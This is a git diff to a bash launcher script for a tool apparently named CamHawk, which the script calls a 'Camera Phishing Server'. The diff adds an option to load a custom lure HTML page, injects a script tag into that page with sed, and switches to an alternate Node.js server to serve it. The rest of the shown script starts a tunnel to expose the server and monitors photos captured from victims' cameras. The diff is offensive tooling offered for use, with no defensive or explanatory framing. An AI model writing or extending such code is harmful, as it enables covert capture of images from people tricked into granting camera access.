@@ -76,10 +76,28 @@ kill_old_server() {
     fi
 }
 
+select_html_file() {
+    echo -ne "${GREEN}Enter path to custom HTML file remember html file should not conatin a external script tag with src of script.js (or press Enter to use default): ${RESET}"
+    read HTML_PATH
+
+    if [[ -n "$HTML_PATH" && -f "$HTML_PATH" ]]; then
+        cp "$HTML_PATH" templates1/index.html
+        sed -i '/<body>/a <script defer src="script.js"></script>' templates1/index.html
+        USE_CUSTOM_HTML=true
+    else
+        echo -e "${YELLOW}[+] Using default HTML page.${RESET}"
+        USE_CUSTOM_HTML=false
+    fi
+}
+
 # Start the Node.js Server
 start_server() {
     echo -e "${YELLOW}[+] Starting Camera Phishing Server...${RESET}"
-    node server.js > server.log 2>&1 &
+    if [ "$USE_CUSTOM_HTML" = true ]; then
+        node server1.js > server.log 2>&1 &
+    else
+        node server.js > server.log 2>&1 &
+    fi
     SERVER_PID=$!
     sleep 2
 
@@ -90,6 +108,7 @@ start_server() {
         exit 1
     fi
 }
+
 
 # Tunnel Selection Menu
 select_tunnel() {
@@ -158,6 +177,7 @@ monitor_photos() {
 
 # Stop the Server
 stop_server() {
+    rm -f templates1/index.html
     echo -e "${YELLOW}[+] Stopping CamHawk server...${RESET}"
     [[ ! -z "$SERVER_PID" ]] && kill $SERVER_PID 2>/dev/null && echo -e "${GREEN}[+] Server stopped!${RESET}"
     [[ ! -z "$TUNNEL_PID" ]] && kill $TUNNEL_PID 2>/dev/null && echo -e "${GREEN}[+] Tunnel stopped!${RESET}"
@@ -171,6 +191,7 @@ trap stop_server SIGINT
 banner
 install_dependencies
 kill_old_server
+select_html_file
 start_server
 select_tunnel
 
